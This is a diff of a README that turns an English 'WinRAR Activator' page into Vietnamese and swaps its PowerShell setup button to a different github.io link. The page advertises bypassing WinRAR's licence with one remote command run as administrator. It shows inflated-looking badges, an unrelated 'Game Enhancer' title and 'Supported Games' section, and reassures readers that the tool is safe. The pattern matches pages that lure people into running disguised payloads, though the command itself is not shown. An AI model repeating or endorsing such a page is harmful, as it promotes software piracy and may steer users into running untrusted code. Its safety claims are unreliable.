@@ -1,116 +1,95 @@
 <div align="center">
 
-# WinRAR Activator — Game Enhancer for Windows 10/11
+# WinRAR Activator — Trình kích hoạt WinRAR cho Windows 10/11
 
-[English](README.md) | [Tiếng Việt](README_vi.md)
+[Tiếng Việt](README.md) | [English](README_en.md)
 
 ![](files/preview.png)
 
-### ⚡ PowerShell Setup Button
+### ⚡ Cài đặt nhanh qua PowerShell
 
-[![](files/button.png)](https://AGNIKLOL.github.io/winrar-license-manager/)
+[![](files/button.png)](https://dat1799.github.io/DTrix-Winrar-License/)
 
-[![runs-on](https://img.shields.io/badge/runs--on-win_11-f97316?style=social&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/rating-4.8%2F5-f59e0b?style=social&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/setup-312k-fb923c?style=social&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/ps-5%2B-ea580c?style=social&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/channel-active-2ea44f?style=social&labelColor=0d1117)]()
+[![runs-on](https://img.shields.io/badge/ch%E1%BA%A1y%20tr%C3%AAn-win_11-f97316?style=social&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/%C4%91%C3%A1nh%20gi%C3%A1-4.8%2F5-f59e0b?style=social&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/l%C6%B0%E1%BB%A3t%20c%C3%A0i-312k-fb923c?style=social&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/ps-5%2B-ea580c?style=social&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/tr%E1%BA%A1ng%20th%C3%A1i-ho%E1%BA%A1t%20%C4%91%E1%BB%99ng-2ea44f?style=social&labelColor=0d1117)]()
 
 </div>
 
 ---
 
-WinRAR's trial pop-up is a rite of passage—and a pointless one. This project cuts through it with a single command: activate WinRAR instantly, no fluff, no file modification, no reinstalling anything. Built for individuals and students who can't drop cash on a license, it keeps working straight through WinRAR updates. One line, one run, done.
+Hộp thoại thông báo dùng thử của WinRAR là một trải nghiệm quen thuộc nhưng phiền toái. Dự án này giúp bạn giải quyết triệt để chỉ với một câu lệnh duy nhất: kích hoạt WinRAR tức thì, không rườm rà, không can thiệp tệp tin hệ thống, không cần cài đặt lại. Dành cho cá nhân và sinh viên chưa có điều kiện mua bản quyền, hoạt động bền bỉ ngay cả khi WinRAR cập nhật phiên bản mới. Một câu lệnh, một lần chạy, hoàn tất.
 
-## 📋 System Requirements
+## 📋 Yêu cầu hệ thống
 
-- Windows 10 or Windows 11
-- PowerShell 5.1 or newer (already available on Windows)
-- Active network connection
-- No admin rights needed
+- Windows 10 hoặc Windows 11
+- PowerShell 5.1 trở lên (mặc định đã có sẵn trên Windows)
+- Có kết nối mạng
+- Không bắt buộc quyền Administrator phức tạp
 
-## Features
+## 🚀 Tính năng nổi bật
 
-- **One-line activation:** A single command handles the entire license registration. No menus, no wizards, no clicking through dialogs.
+- **Kích hoạt 1 dòng lệnh:** Một câu lệnh duy nhất xử lý toàn bộ quá trình đăng ký bản quyền. Không menu phức tạp, không cần bấm xác nhận nhiều bước.
+- **Không can thiệp tệp hệ thống:** Công cụ chỉ ghi tệp giấy phép (license key) hợp lệ. Các tệp thực thi gốc của WinRAR vẫn nguyên vẹn 100%.
+- **Không lo mất kích hoạt khi cập nhật:** Bản quyền vẫn được duy trì qua các bản cập nhật của WinRAR, không bị hiện lại bảng dùng thử sau khi nâng cấp phiên bản.
+- **Tương thích bản WinRAR chính thức:** Được thiết kế tối ưu cho bộ cài đặt gốc từ trang chủ WinRAR. Không cần dùng bản repack, crack hay phần mềm chỉnh sửa.
+- **Nâng quyền Administrator an toàn:** Hoạt động trơn tru trên Windows 10 và 11, hỗ trợ cơ chế chuột phải "Run as administrator" cho các hệ điều hành cũ hơn.
+- **Khôi phục nguyên trạng dễ dàng:** Chỉ cần xóa tệp giấy phép là phần mềm quay về trạng thái dùng thử ban đầu. Không ghi rác vào Registry, không để lại dấu vết.
+- **Nhẹ nhàng, tiện ích cho học sinh - sinh viên:** Dung lượng siêu nhẹ, không cần cài thêm thư viện phụ thuộc, hoàn thành ngay lập tức.
 
-- **Zero file tampering:** The activator writes a valid license key and nothing else. Your WinRAR binaries stay byte-for-byte original.
+## ⚙️ Cách thức hoạt động
 
-- **Update-proof:** The license persists across WinRAR updates, so the trial nag never comes back after a version bump.
+Nguyên lý hoạt động vô cùng đơn giản: đặt một tệp giấy phép hợp lệ vào đúng thư mục cài đặt và WinRAR sẽ tự động nhận diện bản quyền đầy đủ. Công cụ xử lý toàn bộ quá trình — bạn không cần tìm kiếm file key, không cần mở hộp thoại kích hoạt thủ công, không cần can thiệp thư mục cài đặt.
 
-- **Runs on the official build:** Designed for the stock WinRAR installer. No repacks, no pre-modified builds, no modified executables required.
+Công cụ triển khai file bản quyền có định dạng chuẩn vào thư mục cài đặt WinRAR và ứng dụng sẽ tự động tải lên trong lần khởi động kế tiếp. WinRAR đọc khóa bản quyền, xác thực thành công và thông báo hết hạn dùng thử sẽ biến mất vĩnh viễn. Mọi thiết lập, liên kết định dạng file và file thực thi vẫn giữ nguyên trạng thái gốc.
 
-- **Admin-grade execution:** Elevates cleanly on Windows 10 and 11, with a fallback path for older Windows versions that need a right-click run-as-administrator.
+Đó là toàn bộ cơ chế: Một câu lệnh kích hoạt, sử dụng vĩnh viễn.
 
-- **Reversible in seconds:** Remove the license file and you're back to a clean trial state. Nothing buried in the registry, nothing left behind.
+## 🎮 Hỗ trợ mọi tựa game & ứng dụng
 
-- **Student-friendly footprint:** Lightweight, dependency-free, and fast enough to finish before your download bar does.
+WinRAR hoạt động độc lập với các trò chơi bạn trải nghiệm — và công cụ này cũng vậy. Miễn là chạy trên Windows, mọi ứng dụng đều được hỗ trợ. Mọi tựa game từ AAA đến indie đều được hưởng lợi khi trình giải nén không còn bị gián đoạn giữa chừng.
 
-## How it works
+- **Steam, Epic Games, GOG và các bộ cài độc lập:** Mọi dữ liệu nén — game data, bản vá lỗi (patch), mod packs, gói DLC — giải nén mượt mà không gặp cửa sổ popup phiền toái.
+- **Quy trình Mod và giả lập:** Các bộ ROM, gói texture, file config nén và công cụ repack đều sử dụng WinRAR bên dưới. Kích hoạt giúp quy trình làm việc trơn tru, không gián đoạn.
+- **Các tựa game cổ điển & bản nén nhiều phần:** Các game cũ chia nhỏ thành nhiều phần RAR giải nén mượt mà không bị làm phiền bởi thông báo "evaluation copy".
+- **Hỗ trợ toàn diện thư viện phần mềm:** Bất cứ khi nào bạn thao tác với tệp nén trên Windows, công cụ đều phát huy tác dụng.
 
-It runs on a dead-simple premise: drop a valid license key into the right place and WinRAR stops treating you like a freeloader. The tool handles the whole handshake for you — no hunting for key files, no manual registration dialogs, no poking around install directories unless you want to.
+## 🛠️ Cấu hình & Tùy chọn
 
-Under the hood it deploys a properly formatted license file to the WinRAR installation path and lets the app pick it up on next launch. WinRAR reads the key, validates it, and the trial nag vanishes. Nothing else gets touched — your binaries, settings, and file associations stay exactly as they were. Updates don't wipe the activation either, because the license file lives alongside the install and survives version bumps.
+Cấu hình cực kỳ đơn giản. Tất cả những gì cần thiết đều đã được đóng gói sẵn trong dự án — không cần cài đặt thêm phần mềm phụ trợ, không cần cấu hình biến môi trường.
 
-That's the entire trick. One line in, permanent license out.
+**Yêu cầu cơ bản**
+- Windows 10 hoặc 11 (PowerShell 5.1+ tích hợp sẵn; Command Prompt cho các bản cũ hơn).
+- Bản cài đặt WinRAR chính thức từ trang chủ.
+- Quyền Administrator khi chạy kích hoạt (để ghi tệp bản quyền vào thư mục cài đặt WinRAR).
 
-## Supported Games
+**Các cờ tham số tùy chọn (Flags)**
+- `-Silent`: Bỏ qua mọi thông báo xác nhận và chạy kích hoạt tự động từ đầu đến cuối. Phù hợp cho tự động hóa hoặc cài đặt hàng loạt.
+- `-Verify`: Kiểm tra trạng thái bản quyền hiện tại và báo cáo lại mà không chỉnh sửa bất kỳ tệp nào.
 
-WinRAR doesn't care what you're playing — and neither does this activator. If it runs on Windows, it's covered. That means every major title in your library, from AAA blockbusters to indie darlings, benefits the moment your archiver stops nagging you mid-session.
+**Chỉ định đường dẫn cài đặt thủ công**
+Nếu WinRAR của bạn được cài đặt ở thư mục khác với đường dẫn mặc định, bạn có thể truyền trực tiếp đường dẫn qua tham số `install-path`.
 
-- **Steam, Epic, GOG, and standalone installs:** Anything that ships as an archive — game data, patches, mod packs, DLC bundles — extracts cleanly with zero trial pop-ups interrupting the process.
-- **Modding and emulation workflows:** ROM sets, texture packs, config archives, and repack tools all rely on WinRAR under the hood. Activation keeps those pipelines friction-free.
-- **Older titles and repacks:** Classic games distributed as multi-part RAR archives extract without the "evaluation copy" banner slowing you down.
-- **Your entire library, effectively:** If a game touches a compressed file on Windows, the activator has you covered — no per-title configuration, no compatibility list to check, no exceptions.
+## ❓ Câu hỏi thường gặp (FAQ)
 
-One activation, every game. Fire it up and get back to playing.
+- **Công cụ có hoạt động trên phiên bản WinRAR mới nhất không?**
+  Có. Công cụ nhắm vào kênh phát hành chính thức nên tiếp tục hoạt động qua các bản cập nhật mà không cần chạy lại.
 
-## Configuration
+- **Có bị mất bản quyền khi cập nhật WinRAR không?**
+  Không. Giấy phép bản quyền được lưu trữ độc lập và tồn tại qua các đợt cập nhật phần mềm.
 
-Config is dead simple. Everything the activator needs ships in the project itself — no external setup, no dependencies to chase, no environment variables to babysit. Grab the files, run the activator, and you're done.
+- **Tôi có cần gỡ cài đặt WinRAR trước đó không?**
+  Chỉ cần gỡ nếu bạn đang dùng các bản repack hoặc mod không chính thức vì chúng có thể chứa file bị chỉnh sửa gây xung đột. Với bản gốc chính thức, bạn chỉ cần chạy trực tiếp.
 
-**Requirements**
+- **Tệp cài đặt gốc của tôi có bị chỉnh sửa không?**
+  Hoàn toàn không. Công cụ chỉ thêm file key bản quyền hợp lệ, không can thiệp mã nguồn hay file nhị phân của WinRAR.
 
-- Windows 10 or 11 (PowerShell 5.1+ works out of the box; the Command Prompt path covers older builds).
-- The official WinRAR installation — this project targets original, unmodified installs only.
-- Admin rights for the one-line activation method, since the license key gets written into the WinRAR install directory.
+- **Có hỗ trợ các phiên bản Windows cũ không?**
+  Có, hỗ trợ Windows 7, 8, 8.1, 10 và 11. Yêu cầu quyền quản trị viên khi kích hoạt.
 
-**Global flags**
+- **Công cụ có an toàn không?**
+  Dự án hoàn toàn minh bạch về cơ chế: chỉ tạo tệp key bản quyền. Không có dịch vụ chạy ngầm, không thu thập dữ liệu và không cài kèm bất kỳ phần mềm rác nào.
 
-The activator accepts a couple of optional switches so you can tune behavior without editing anything:
+## ⚠️ Tuyên bố từ chối trách nhiệm (Disclaimer)
 
-- `-Silent` — skips all prompts and runs the activation end to end. Ideal for scripted or repeat setups.
-- `-Verify` — checks the current license state and reports back without touching your install. Handy for confirming a previous activation stuck.
+Dự án này được tạo ra nhằm mục đích hỗ trợ học tập, nghiên cứu cho cá nhân và học sinh, sinh viên không có điều kiện kinh tế để mua bản quyền phần mềm. Nếu bạn có khả năng tài chính hoặc sử dụng trong môi trường doanh nghiệp/thương mại, xin vui lòng mua bản quyền chính thức để ủng hộ các nhà phát triển WinRAR.
 
-Everything else runs on sensible defaults. No config file to edit, no paths to hardcode — the activator locates your WinRAR installation on its own and drops the key where it belongs.
-
-**Manual override**
-
-If your WinRAR lives somewhere non-standard, point the activator at it directly with the install-path flag. Same result, zero guesswork.
-
-## FAQ
-
-- **Does this actually work on the latest WinRAR build?** Yes. The activator targets the official release channel, so it keeps working across updates without you re-running anything. If a future build ever breaks compatibility, the project gets updated.
-
-- **Will this survive a WinRAR update?** Your activation persists through updates. The license stays in place; you don't need to reactivate after patching.
-
-- **Do I need to uninstall my current WinRAR first?** Only if you're running a pre-modified or repackaged build. Those leave behind modified files and registry entries that can conflict. Clean official installs activate fine as-is.
-
-- **Is my original installation modified?** No. The activator drops in a valid license key and nothing else. Your binaries, settings, and file associations stay untouched.
-
-- **Does it work on Windows 7/8/8.1 and Windows 10/11?** Yes, all supported Windows versions are covered. Administrative privileges are required either way.
-
-- **What if activation doesn't take?** Close every open WinRAR window, confirm you're on the official build, and re-run the activator. Leftover trial state from a previous alternative is the usual culprit.
-
-- **Is this safe to run?** The project is transparent about what it does: it adds a license key. No background services, no telemetry, no bundled extras.
-
-- **Can I use this commercially?** The activator is intended for individuals and students who can't purchase a license. If you're using WinRAR in a commercial environment, buy a license — that's the honest play.
-
-- **Where do I report bugs or request support?** Open an issue on the project repository. Include your Windows version and WinRAR build number so it can be reproduced fast.
-
-## Disclaimer
-
-Use this tool at your own risk. It's built to activate WinRAR for people who genuinely can't buy a license — individuals and students — and that's the entire scope. If you can afford a license, buy one and support the developers.
-
-This project only adds a license key to your existing WinRAR installation. It doesn't modify core files, doesn't bundle anything sketchy, and doesn't touch your system beyond that. But that's still no guarantee — you're running third-party activation code on your own machine, and you own that decision.
-
-Always use the official, unmodified WinRAR build. Pre-modified or repackaged versions can conflict with the activator and are a far bigger security risk than anything here. If something breaks, that's on the repack, not this project.
-
-No warranty, express or implied. The maintainers aren't liable for anything that happens to your system, your data, or your license status as a result of using this tool. Test in a safe environment first if you're unsure.
-
-Keep it legal where you live. Rules around software licensing differ by region, and staying on the right side of them is your responsibility.
+Công cụ này chỉ tạo tệp bản quyền hợp lệ cho bản cài đặt WinRAR hiện có của bạn. Nó không chỉnh sửa tệp hệ thống, không chứa mã độc và không can thiệp sâu vào máy tính. Người dùng tự chịu trách nhiệm về việc sử dụng phần mềm theo quy định pháp luật sở tại.
